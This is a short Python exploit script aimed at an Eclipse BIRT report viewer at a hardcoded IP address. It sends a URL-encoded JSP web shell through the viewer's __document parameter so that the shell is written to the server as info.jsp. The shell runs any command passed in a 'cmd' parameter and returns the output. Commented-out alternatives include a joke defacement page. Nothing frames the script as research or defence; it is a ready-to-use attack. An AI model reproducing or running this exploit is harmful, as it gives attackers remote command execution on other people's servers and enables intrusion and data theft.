import requests as re

payload ="%0A%3C%25%40%20page%20import%3D%22java.util.%2A%2Cjava.io.%2A%22%25%3E%0A%3C%25%0A%2F%2F%0A%2F%2F%20JSP_KIT%0A%2F%2F%0A%2F%2F%20cmd.jsp%20%3D%20Command%20Execution%20%28unix%29%0A%2F%2F%0A%2F%2F%20by%3A%20Unknown%0A%2F%2F%20modified%3A%2027%2F06%2F2003%0A%2F%2F%0A%25%3E%0A%3CHTML%3E%3CBODY%3E%0A%3CFORM%20METHOD%3D%22GET%22%20NAME%3D%22myform%22%20ACTION%3D%22%22%3E%0A%3CINPUT%20TYPE%3D%22text%22%20NAME%3D%22cmd%22%3E%0A%3CINPUT%20TYPE%3D%22submit%22%20VALUE%3D%22Send%22%3E%0A%3C%2FFORM%3E%0A%3Cpre%3E%0A%3C%25%0Aif%20%28request.getParameter%28%22cmd%22%29%20%21%3D%20null%29%20%7B%0A%20%20%20%20%20%20%20%20out.println%28%22Command%3A%20%22%20%2B%20request.getParameter%28%22cmd%22%29%20%2B%20%22%3CBR%3E%22%29%3B%0A%20%20%20%20%20%20%20%20Process%20p%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B%0A%20%20%20%20%20%20%20%20OutputStream%20os%20%3D%20p.getOutputStream%28%29%3B%0A%20%20%20%20%20%20%20%20InputStream%20in%20%3D%20p.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20DataInputStream%20dis%20%3D%20new%20DataInputStream%28in%29%3B%0A%20%20%20%20%20%20%20%20String%20disr%20%3D%20dis.readLine%28%29%3B%0A%20%20%20%20%20%20%20%20while%20%28%20disr%20%21%3D%20null%20%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20out.println%28disr%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20disr%20%3D%20dis.readLine%28%29%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%25%3E%0A%3C%2Fpre%3E%0A%3C%2FBODY%3E%3C%2FHTML%3E"
#payload="%3Chtml%3E%0A%3Ctitle%3Ellmao%3C%2Ftitle%3E%0A%3Cbody%3E%0A%3Cimg%20src%3D%22https%3A%2F%2Fc4.wallpaperflare.com%2Fwallpaper%2F966%2F989%2F139%2Fshrek-movies-animated-movies-dreamworks-hd-wallpaper-preview.jpg%22%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E"
#payload = "hue hue hue hue"
#url = f"http://14.99.184.178:8080/birt/output?__report=test.rptdesign&__format=pdf&__overwrite=true&__document=./test.jsp&sample={payload}"
url = f"http://14.99.184.178:8080/birt/output?__report=test.rptdesign&__format=pdf&__overwrite=true&__document=./info.jsp&sample={payload}"


send=re.get(url)

print(send.status_code)
